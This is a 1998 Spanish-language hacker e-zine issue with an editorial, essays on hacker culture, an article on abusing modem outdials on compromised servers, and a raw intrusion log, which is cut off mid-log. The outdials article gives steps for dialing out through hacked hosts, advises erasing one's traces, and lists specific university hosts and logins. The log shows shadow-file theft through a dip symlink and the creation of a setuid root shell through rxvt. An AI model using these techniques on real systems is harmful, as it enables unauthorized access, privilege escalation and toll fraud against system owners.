

                   
               
                        ÉÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ»
                        ³                  ÚÄÄÄÄÄÄ¿  ³
                        ³                  ³ÛÛÛÛÛÛ³  ³
                        ³           ÚÄÄÄÄÄÄ´ÛÛÚÄÄÄÙ  ³
                        ³    ÚÄÄÄÄÄÄ´ÛÛÛÛÛÛ³ÛÛÀÄ¿    ³
                        ³    ³ÛÛÛÛÛÛÃÄ¿ÛÛÚÄ´ÛÛÛÛ³    ³
                        ³    ÀÄ¿ÛÛÚÄÁ¿³ÛÛ³J³ÛÛÚÄÙ    ³
                        ³  ÚÄÄ¿³ÛÛ³ÛÛÀÙÛÛ³J³ÛÛ³      ³  
                        ³  ³ÛÛÀÙÛÛ³ÛÛÛÛÛÛ³FÃÄÄÙ      ³  
                        ³  ³ÛÛÛÛÛÛÃÄÄÄÄÄÄÁÄÙ         ³  
                        ³  ÀÄÄÄÄÄÄÙ                  ³  
                        ³   H A C K E R S  T E A M   ³  
                        ³       J O U R N A L        ³  
                        ÌÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¹        
                        ³     VOL. #1, N§3, 1998.    ³ 
                        ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼


           "LA CAMINATA MAS LARGA ES EL PRIMER PASO" probervio hindu.


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=          

     Nota: - J.J.F. / HACKERS TEAM - no se hace responsable del mal uso
           de la informacion aqui expuesta y tampoco tiene que estar
           de acuerdo con lo que sus colaboradores opinen.
           Tampoco esperamos que la gente use la informacion aqui expuesta
           para hacer da¤o ya que tan solo es con fines didacticos.
 
     Recomendado el uso del editor del MS-DOS.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=          

     #CURRENT MEMBERS :

     - CONDE VAMPIRO     - CODER  H/P/V  EDITOR
     - MAC CRACK BISHOP  - CODER  C      WEBMASTER
     
     #WEB OFICIAL :

     - http://www.angelfire.com/mi/JJFHackers
     - http://jjfhackers.home.ml.org

     #E-MAIL OFICIAL :

     - jjf_team@usa.net      <=============== NUEVO !!!!!

     #DISTRIBUIDORES OFICIALES DEL E-ZINE:

     - http://wakanda.islatortuga.com
     - http://underhack.islatortuga.com

     #COLABORADORES CON ESTE NUMERO :

     - Koji
     - Nobody
     - Cesar
     - Bisho
     - Enif (Oioio)
     - Daemon  

     #SALUDOS:

     - Metalslug (Wakanda)
     - Schoddy Guy (Underhack)

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

  - INDICE.                                  

    TITULO                                        AUTOR
  ÄÄÄÄÄÄÄÄÄÄÄÄ\_______________________________/ÄÄÄÄÄÄÄÄÄÄÄÄ

  * EDITORIAL ................................ J.J.F. / HACKERS TEAM
  * MIEDO A LOS ARTICULOS: NO, GRACIAS ....... CONDE VAMPIRO.
  * QUE ES UN HACKER Y QUE ES UN CRACKER ..... BISHO.
  * LOS OUTDIALS EN INTERNET ................. NOBODY.
  * UN LOG DE UN SERVIDOR .................... ANONIMO.
  * CURSO DE HACK III ........................ CONDE VAMPIRO.
  * USO DE SAMBA EN LINUX/UNIX COMO
    SUSTITUTO DEL NBTSTAT .................... ENIF.
  * ESTADISTICA DE LOS HACKERS EN 1997 ....... J.J.F. / HACKERS TEAM
  * DOCUMENTO SOBRE LOS PERMISOS DE ARCHIVOS
    Y DIRECTORIOS PARA SISTEMAS UNIX ......... KOJI.
  * INTRODUCCION AL HACKING v2.0 I ........... DAEMON.
  * EL LECTOR OPINA .......................... VARIOS.
  * NOTICIAS UNDERGROUND ..................... J.J.F. / HACKERS TEAM

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

  -------------
  ³ EDITORIAL ³
  -------------

        Bueno esto parece que funciona ya que estamos en el tercer numero, y
  nosotros contentisimos de ello. Ya que cada vez la gente nos apoya mas y
  ademas contamos con mas distribuidores oficiales, como Underhack, tambien
  como ya dijimos seguimos con Wakanda. Poco a poco vamos avanzando en este
  dificil mundo del hack, sobre todo para bien, que es lo mejor del caso ;-)

        Hemos creado una nueva seccion en el e-zine llamada EL LECTOR OPINA en
  la cual se iran poniendo los mail's en los cuales nos haceis preguntas, asi
  las podemos contestar aqui en el e-zine y ademas todos podeis ver las
  respuestas y asi aprendemos todos ;-) por lo que ya NO contestaremos a los
  mail's que nos envieis, solo teneis que ser pacientes y esperar la salida
  del e-zine que se intenta que sea con la mayor rapidez posible. thx a todos!
  
        La verdad es que poco a poco vamos mejorando nuestro e-zine, no solo
  en maquetacion sino tambien en la calidad de los articulos que vosotros nos
  enviais!!! pero no solo mejora nuestro/vuestro e-zine sino tambien nuestro
  web, en el cual siempre podreis encontrar lo que necesitais y sino lo pides
  y veremos que podemos hacer. Que decir de la ya conocida seccion TEAM donde
  encontraras documentacion y programas propios de - J.J.F. / HACKERS TEAM -
  que NO encontraras en ningun otro web. Ademas todas nuestras secciones ya
  estan abiertas donde escontrareis de todo :)

        Damos las gracias a todos los lectores que nos envian mail diciendo
  como le gusta nuestro web o el ezine, esto nos alegra mucho y ademas lo
  hacemos con mucho gusto para que por fin encontreis algo para disfrutarlo
  de verdad. Por supuesto, no vamos a subirnos a los laures y seguiremos
  trabajando duramente el web y el e-zine. Sobre las felicitaciones que
  estamos recibiendo nos sorpendre mucho que los mail's vengan del otro
  lado del charco pero nos alegra que nos lean con tanta fidelidad desde alli,
  por eso desde aqui saludamos a todos nuestros lectores hispanos de Las
  Americas. Tambien agradecer la favorable opinion de SET (SET n§ 13) en la
  cual apoyan este e-zine, aunque se han olvidado de mencionar que nosotros
  tambien les tenemos puesto un link ;-)

        Hay que decir que el mundo del hack hispano esta siendo cada vez mas
  numeroso y ya cada vez hay mas web's (pero ya se sabe que la mitad de web's
  dejan mucho que desear, sin animo de ofender :). Pero no todo son alegrias
  ya que quedan muchos campos todavia por mejorar, que decir de las news
  de hack hispanas... Realmente pesimas y parece mas bien de intercambio de
  programas que de hack, una verdadera lastima pero en fin, esperamos que se
  arregle pronto la situacion del panorama actual o por lo menos nosotros
  pensamos contribuir a ello de alguna forma.

        Como ya hemos manifestado varias veces, estamos esperando a que nos
  envies un articulo tuyo, ademas no solo hay que enviar articulos puedes
  enviar todo lo que consideres interesante para este e-zine, como por
  ejemplo algun hacking que hayas cometido (por supuesto con el maximo
  anonimato, ningun dato sera revelado por parte nuestra ;-), o alguna
  noticia sobre el underground, o quieres anunciar algun proyecto, etc...
  Por supuesto tambien queremos que nos escribas para decirnos que piensas
  del e-zine, del web, etc... Al igual que si tienes cualquier propuesta,
  sugerencia, critica o solo nos quieres saludar, adelante, escribemos a:

  jjf_team@usa.net

  ATENCION : Como veis hemos cambiado la direccion de mail, la antigua
  la de hotmail todavia seguira funcionando pero solo durante un tiempo, esto
  lo hacemos para que os de tiempo a cambiarlo. Nuestro nuevo mail es el de
  arriba :) Tambien deciros que nuestros mail's personales tambien han
  cambiado y son de la siguente manera:

  conde_vampiro@usa.net

  mac_crac@usa.net

  Ahora que todo esta aclarado, que empieze la diversion ;-)

                                                   - J.J.F. / HACKERS TEAM -

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

                     /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
                     > MIEDO A LOS ARTICULOS: NO, GRACIAS <
                     \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/

        Este articulo no tiene que ver con el hack directamente, es una
  reflexion de porque hay que escribir un articulo en cualquier e-zine. Esto
  viene a raiz de cuando estas hablando con alquien (principalmente en el
  irc), primero te cuenta que tal y tal..., que acaba de hackear un server,
  tal y tal..., tu piensas "joer, que tio" y le dices, "porque no escribes un
  articulo y lo envias a algun e-zine", pero te dice todo asustado: si no me
  veo capaz, tal y tal...

        Por eso aqui os dire una serie de puntos por los cuales hay que
  escribir un articulo. Hay van:

  1 - Para escribir sobre alguna cosa tenemos que buscar info y leer mucho,
      con esto aprenderemos y avanzaremos en nuestros conocimientos.

  2 - Si traducimos textos en ingles, mejoraremos nuestro ingles, algo
      necesario en nuestros dias.

  3 - Escribiendo articulos ayudaras a los e-zines para que sigan mejorando.

  4 - Poco a poco, cuando la gente vaya leyendo tus articulos, sabran de tu
      existencia y te iras abriendo paso en el underground.

  5 - Puedes pensar que tu articulo sera muy basico pero siempre hay alguien
      por debajo que no lo sabra.

  6 - No hay articulos malos, sino poco trabajados :)

  7 - Cuando la gente vea tus trabajos, te pediran consejo e incluso ofertas
      de entrar en algun grupo de hack.

  8 - La proliferacion de articulos en nuestra lengua, refleja el estado del
      underground hispano.

  9 - Siempre hay sobre algo que escribir, ya sea algo nuevo o mejorar uno ya
      escrito.

  10 - Tendras algo que contar a tus amigos, novia!! y sobre todo, a tus
       nietos ;-)

        Bueno, pues estos son los 10 puntos por lo que hay que contribuir en
  la mejora del underground hispano. Pues ya sabes a ESCRIBIR :))

                                                         CONDE VAMPIRO
                                                   - J.J.F. / HACKERS TEAM -

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

                       /--------------------------------\
                     <Que es un hacker y que es un cracker>
                      ------------------------------------

        Hasta ahora ha habido muchos articulos (sobre todo en internet) sobre
  la diferencia entre hackers y crackers. En estos articulos, los autores han
  tratado de hacer entender quien es cada cosa para que no haya
  malinterpretaciones sobre los dos terminos.

        Durante mucho tiempo, la opinion publica ha confundido estos terminos,
  llamandonos "piratas informaticos" por ejemplo y cosas por el estilo, desde
  luego que yo tambien se que es mas facil generalizar que enterarte realmente
  de lo que es cada cosa, y lo peor es confundir el termino hacker con
  cracker, como muchos medios han echo. Por eso la opinion publica trata de
  hacker a alguien que ROMPE dentro de un sistema. Totalmente confundido, y
  ademas es un insulto para muchos hackers y con mucho talento para el dificil
  arte del hack!

        Hay gran cantidad de textos que intentan definir estos terminos. Por
  eso he seleccionado los que creo que son mas acertados. Bien por eso vamos
  a intentar "definir" los terminos:

  _Hacker: Es una persona REALMENTE interesada en los lados mas reconditos y
           oscuros de un SO de cualquier ordenador. La mayoria o muchos de
           ellos son programadores. Por eso los hackers tienen un
           conocimiento MUY avanzado en cuanto a programacion se refiere.
           Conocen muchos de los agujeros de los SO, y lo mas importante,
           conocen el POR QUE de esos agujeros. Los hackers estan buscando
           informacion continuamente, y la hacen publica cuando la encuentran,
           y NUNCA estropean datos del ordenador intencionadamente.

  _Cracker: Es una persona que ROMPE dentro de un sistema o viola la
            integridad del sistema a traves de sistemas remotos con, digamos,
            ideas maliciosas. Los crackers ganan acceso sin autorizacion,
            destruyen o roban datos importantes, incluso vitales, o
            simplemente causan problemas a su "blanco". Los crackers pueden
            ser facilmente identificados por sus actos maliciosos.

        Bueno, espero haberte aclarado un poco, aunque supongo que estareis
  pensando... ya claro, pero un hacker entra tambien a un sistema, cual es la
  diferencia?, Bien, vamos a ponerlo en plan metafora:

        Tenemos una casa, no? bien, pues que haria un hacker?, sencillo,
  llegaria a la casa, daria la vuelta alrededor de la misma, y entraria por
  la puerta de atras, despues daria una vuelta por la casa, miraria, y se
  marcharia, por el contrario, el cracker, tiraria una piedra contra la
  ventana, entraria y te "limpiaria" la casa de arriba a abajo. La diferencia?
  tu nunca sabrias que el hacker entro en tu casa pero SI sabras que el
  cracker estuvo. Pues bien, tu ordenador, terminal o servidor, es TU CASA.

        Despues de esto vamos a repasar unos cuantos nombres que todos o la
  mayoria ya los conocemos y seguro que mas de uno se va a llevar una
  sorpresa (incluso yo).

  Los Hackers:

  _Richard Stallman: Se unio al Laboratorio de inteligencia artificial de la
                     MIT en el 71. Le dieron el premio McArthur por su
                     desarrollo de software. Despues fundo la Free Software
                     Foundation, creando aplicaciones y programas gratis.

  _Dennis Ritchie, Ken Thomson y Brian Kerrighan: Programadores de los
                   laboratorios Bell. Fueron los que desarrollaron el UNIX y
                   el C. Por ejemplo sin estos programadores posiblemente no
                   existiera internet. Ahora Ritchie, sigue trabajando en los
                   laboratorios Bell desarrollando el llamada Plan9, que se
                   supone que sera un nuevo super-sistema operativo que le
                   quitara el trono al UNIX.

  _Paul Baram, Rand Corporation: Posiblemente el mayor hacker de la historia.
                                 Ya hackeaba internet antes de que existiera.
                                 El fue quien introdujo el concepto de Hacker.

  _Eugene Spafford: Profesor de informatica. Colaboro para crear el Computer
                    Oracle Password Security System (COPS) un sistema de
                    seguridad semi-automatico. Hombre muy respetado en el
                    campo de la seguridad.

  _Dan Farmer: Trabajo con Spafford en la creacion de COPS (1991) y al mismo
               tiempo con el famoso Computer Emergency Response Team (CERT).
               Tiempo mas tarde Farmer gano gran notoriedad al crear el
               System Administrator Tool for Analyzing Networks (SATAN). Una
               gran herramienta para analizar vulnerabilidades en redes.

  _Wietse Vehema: Vehema viene de la Universidad de Tecnologia de Eindhoven,
                  en los Paises Bajos. Un gran programador, con un don para
                  ello, ademas de tener un amplio historial en programas
                  sobre seguridad. Es el co-autor del SATAN con Farmer.
                  Vehema escribio el TCP Wrapper, uno de los programas de
                  seguridad mas usado en el mundo.

  _Linus Torvalds: Un individuo extraordinario, Torvalds empezo a conocer el
                   UNIX y a tomar clases de programacion en C sobre los 90. Un
                   a¤o despues empezo a escribir un SO parecido al UNIX.
                   Despues de otro a¤o, lo colgo en internet, es el llamado
                   LINUX. Ahora mismo el LINUX es un culto entre
                   programadores, por ser el unico SO programado por gente q
                   seguramente ni se conoceran en toda su vida. Adenas el
                   LINUX no tiene el fastidioso copyright, es gratis y libre.

  _Bill Gates y Paul Allen: En sus tiempos de instituto, estos dos hombres de
                            Washington se dedicaban a hackear software.
                            Grandes programadores. Empezaron en los 80 y han
                            creado el mayor imperio de software de todo el
                            mundo. Sus "exitos" incluyen el SO MS-DOS,
                            Windows, Windows 95 y Windows NT.

  Los Crackers:

  _Kevin Mitnick: Mas conocido como "Condor", probablemente el cracker mas
                  conocido del mundo. Mitnick empezo su "carrera" como
                  phreaker, desde entonces, mitnick ha crackeado todo tipo de
                  seguridad imaginable, incluyendo lugares militares,
                  corporaciones financieras, firmas de software y compa¤ias
                  telefonicas. Por ejemplo, siendo todavia un adolescente,
                  crackeo la North American Aerospace Defense Command. Ahora
                  mismo esta esperando una sentencia judicial por sus ataques
                  cometidos entre 1994 y 95.

  _Kevin Poulsen: Siguio el mismo camino que Mitnick, pero es mas conocido
                  por su habilidad para controlar el sistema telefonico de
                  Pacific Bell. Incluso llego a "ganar" un Porsche en un
                  concurso radiofonico, si su llamada fuera la 102, y asi fue.
                  Poulsen tambien crackeo todo tipo de sitios, pero el se
                  decantaba por los que contenian material de defensa
                  nacional. Esto fue lo que le llevo a su estancia en la
                  carcel, 5 a¤os, le soltaron en el 96, supuestamente
                  "reformado" :-). Que dicho sea de paso, es el mayor tiempo
                  de estancia en la carcel que ha comparecido un hacker en la
                  carcel;

  _Justin Tanner Peterson: Mas conocido como Agent Steal. Peterson crackeaba
                           las agencias de credito, es decir, le iba mas el
                           dinero que la curiosidad. Esta falta de
                           personalidad le llevo a su caida y a la de otros,
                           por ejemplo cuando le pillaron, Peterson descubrio
                           a todos sus amigos, incluyendo a Kevin Poulsen.
                           Despues obtuvo un trato con el FBI para trabajar de
                           clandestino. Esto le facilito su salida de la
                           carcel y "no?" pudo ser demostrado un fraude
                           mediante una trasferencia de dinero :-).

        Bueno, despues de todo esto, espero que os haya quedado un poco mas
  claro de que o quien es cada cosa, y a lo mejor te he ayudado a
  identificarte a ti tambien, quien sabe... Hala! hasta otra :-).

  Saludos a : - J.J.F. / HACKERS TEAM -, Wakanda y Underhack.

              #hackers, #seguridad_informatica

              Nobody, Fragel, Folixia, Metalslug y a todos los demas.

  Er Bisho

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
                                                                   07-12-1997.
                                                                     ??????   
                        ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
                       ÉÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ»²²
                       ³  LOS OUTDIALS EN INTERNET  ³²²
                       ³                            ³²²
                       ³                  by NOBODY ³²²
                       ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼

        Nota del Autor: No me hago responsable del mal uso del la informacion
  aqui expuesta, ya que es para fines didacticos y no espero que abuses
  de ello.

        Los outdials son sistemas informaticos que nos permitiran conectar
  con BBS de otros paises, que esten cerca de casa o donde nos de la gana.
  Tambien los podemos usar para conectar a otras redes. Principalmente se
  usan para conectar a BBS extranjeras.

        Para conectar a un outdial lo que hacemos es buscar por internet un
  servidor que nos permita salir y asi llamar a donde queramos sin gastar
  nuestro dinero en llamadas internacionales :). Un ejemplo grafico de como
  seria esto es:
                             SERVIDOR
     Ä      INTERNET        Ä   SINGAPUR
    ³X³ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>³S³
     Ä                      Ä          Ä
    HACKER                  ÀÄÄÄÄÄÄÄÄ>³B³
    ESPA¥A                 LLAMADA     Ä  BBS
                        INTERNACIONAL      ALEMANIA

        Como podeis ver hemos conectado desde nuestro ordenador en Espa¤a a
  un servidor el cual se encuentra en Singapur por internet pero luego
  hemos usado uno de sus modems para hacer una llamada externa y salir de
  internet para conectar con una BBS en Alemnia, con la que tendriamos que
  pagar un ri¤on si quisiesemos conectar con la BBS.

        Generalmente encontrar estos servidores es dificil, hay varias listas
  (abajo os pondre una). Ademas muchas veces estos outdial estan configurados
  para que solo permitan llamadas locales. Los buenos outdial son conocidos
  por GOD (Global OutDials) ya que permiten realizar llamadas a donde se
  quiera pero no son frecuentes ademas suelen cerrar rapido debido a su uso.

        Cuando querramos usar un outdial, pues lo que hacemos es conectar
  mediante telnet a un servidor que tenga outdial y generalmente para
  realizar la conexion escribimos ATDT XXXXXXXXX, donde X es el numero al
  que queremos conectar. Puede que el outdial al que conectemos no funcione
  asi por lo que tendremos que averiguar como funciona.

        Si hackeamos un servidor por inet podemos intentar averiguar si
  podemos hacer outdial. Supongamos que estamos dentro de un servidor pues
  buscamos el fichero L-devices, que se encuentra en el directorio
  /usr/lib/uucp, si no esta este fichero en este lugar lo tendremos que
  buscar, para ello escribimos: "find / -name L-devices -print". 
   
        Cuando ya hemos encontrado el fichero en cuestion lo editamos:
  "cat L-devices", si este fichero es muy grande y no cabe en la pantalla
  escribe:"cat L-devices | more". Cuando el fichero este editado, nos
  mostrara la informacion relacionada con los modems, entonces escogemos
  una terninal (ttynn, nn sera el numero) y su velocidad (Baudios). Y ya
  podemos conectar donde queramos :)

        Como he dicho antes si no encontramos el fichero L-devices de ninguna
  forma tendremos que hacerlo de otro modo. Escribimos:"who am i", nos dara
  informacion de nosotros mismos, entonces miramos en que terminal estamos
  conectados. Si estamos conectados mediante un modem al servidor y estamos
  en la tty07, seguramente los que estan cerca nuestra tambien sean modems,
  como por ejemplo el tty06 o el tty08.

              OUTDIAL
        ÄÄÄÄÄ³ÄÄÄÄÄÄÄ³ÄÄÄÄÄÄÄ³ÄÄÄÄÄÄ³ÄÄÄÄÄÄ
            / \     / \     / \    / \
             ³       ³       ³      ³     MODEMS
             ³       ³       ³      ³
             ³       ³       ³      ³
           tty05   tty06    tty07  tty08
                           HACKER

        Ahora tendremos que conectar directamente con el modem y esto lo
  haremos asi:"cu -sbaudios -l/dev/ttynn dir". Donde en "baudios" y "ttynn"
  podremos la informacion que hallamos obtenido del proceso anterior. Si
  todo ha salido bien nos tendria que haver salido el mensaje de
  "Connected".

        Ahora nos encontramos hablando directamente con el modem, en este
  punto conviene salvar la configuracion escribiendo:"AT&W". Si cuando
  escribimos no aparece lo que escribimos no pasa nada ya que seguramente
  esta activado el echo off. Entonces ahora escribimos:"AT&F" para
  restaurar la configuracion predeterminada. Ya solo nos queda configurar
  el modem para nuestros propositos y usarlo tranquilamente. Cuando
  hallamos terminado, escribimos:"ATZ" y para volver a poner la
  configuracion antigua:"~.". Con esto nos tendria que haver salido el
  mensaje de "Disconnected" y estaremos otra vez en el shell.

        Logicamente esto es ilegal y conviene tomar medidas para protegerse,
  como por ejemplo usar varios nodos antes de llegar a conectar al outdial.
  Tambien podemos borrar nuestras huellas en el servidor.

        Aqui os pongo una lista de outdial que podemos intentar usar, pero es
  un poco antigua por lo que conviene buscar alguna lista mas reciente,
  pero nunca se sabe :)

       129.219.17.3                    login: MODEM
                                        atdt 8xxx-xxxx
       dialout.lcs.mit.edu
       dialout24.cac.washington.edu
       ublan.acc.virginia.edu          c hayes
       129.82.100.64                   login: modem
       modem.uwyo.edu                  
       129.119.131.11x  (x = 1 to 4)
       emory.edu                       .modem8 or 
					.dialout
       pacx.utcs.utoronto.ca           modem
					atdt 9xxx-xxxx
       128.249.27.154                  c modem96
					atdt 9xxx-xxxx
       128.249.27.153                  " -+ as above +- "
       130.191.4.70                    atdt 8xxx-xxxx
       132.204.2.11                    externe#9 9xxx-xxxx
       uknet.uky.edu                   outdial2400
					atdt 9xxx-xxxx
       gate.cis.pitt.edu               LAT
					connect dialout

        Pues esto es todo y espero que os halla gustado y tened cuidado con
  lo que haceis. Si tienes una lista actualizada enviala al mail de JJF
  para que se publique.

  Y desde aqui saludar a toda la pe¤a de #hackers, #hack, #rejoin &
  #seguridad_informatica !!!!!!

  Grupos como - J.J.F. / HACKERS TEAM - , CYBERHACK, WAKANDA, UNDERHACK,
  @pOkalypSYS y todos los demas !!

  Y por supuesto : Bisho, Folixia, Fragel, Ipgh0st, Metalslug, Dillet, Riddle,
  Hadden, Guybrush, Tdp, Virux, Cy, Angelipas, Schoddy Guy, Xus, Enif,
  Bit-Quake, L.A., Nadia, Amanda, Case_zero y todos los que me dejo :)

                                                            NOBODY (c) 1997.

<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>

                         Ú-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-----  
                         ³ UN LOG DE UN SERVIDOR ³ 
                         ----ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ù

        Este fichero log fue enviado anonimamente a un mailing list de
  hackers y hemos pensado que os podia ser interesante y por eso lo hemos
  incluido.

        Se dice que este log fue una entrada a un server por la famosa
  Carolyn P. Meinel. una de las grandes mujeres hacker's. Famosa tambien
  por su mailing list sobre hack y por supuesto las ya conocidas "GUIDE
  TO (mostly) HARMLESS HACKING".

  Nota de - J.J.F. / HACKERS TEAM -: Logicamente no podemos verificar la
  autenticidad de este log pero de todas formas es muy interesante y prodeis
  aprender algo de el. Pensamos que tampoco tiene ninguna complicacion por lo
  que no se explicara, asi que os dejamos que trabajeis esa mente, que para
  algo esta!!

  TAMBIEN DECIR QUE NOSOTROS NO SABEMOS NADA SOBRE EL HACKEO DE ESTE SERVER
  Y NO ESTAMOS RELACIONADOS DE NINGUNA FORMA.!!!!!!!!!!!!!

------------ Comienzo del log ------------------------------------------------

  cd usr/bin
  pwd
  cd ..
  ls
  who
  cd ..
  ls
  cd bin
  cd convfont
  ls
  ls c*
  pwd
  cd ..
  ls
  cd usr
  ls
  cd bin
  cd convfont
  ls
  ls con*
  ls co*
  cd ..
  ls
  cd X11R6
  cd bin
  ls
  ls -l
  cd ..
  cd ..
  cd ..
  ls
  ln -s /etc/shadow /tmp/dummy.dip
  cd etc
  ls
  cd shadow
  ls sha*
  /sbin/dip -v /tmp/dummy.dip
  ln -s /etc.shadow /tmp/dummy.dip
  cd du*
  cd tmp
  cd etc/tmp
  ls
  cd tmp
  cd ..
  ls
  cd tmp
  ls du*
  ls -l
  ls du* -l
  cat dummy.dip
  cc stuff.c
  ls
  man cc
  who
  make stuff.c
  cc stuff.c
  cat stuff.c
  ls
  rm stuff.c
  whoami
  cat < /dev/tty1
  dip -t
  cd ..
  cd ..
  ls
  cd etc
  cdbin
  cd bin
  ls
  cd ..
  ls
  cd dev
  ls
  dir di*
  cd ..
  ls
  cd bin
  ls di*
  cd ..
  dip
  dip
  su +username
  su -- -username
  ls
  who
  echo 'cp /bin/sh /tmp/rxsh:chmod 4755 /tmp/rxsh' > /tmp/rxbug
  chmod +x /tmp/rxbug
  rxvt -print-pipe /tmp/rxbug
  rxvt
  cd usr/X11R6/bin
  cd ..
  ls
  cd ..
  ls
  cd usr
  ls
  cd X11R6
  ls
  cd bin
  ls
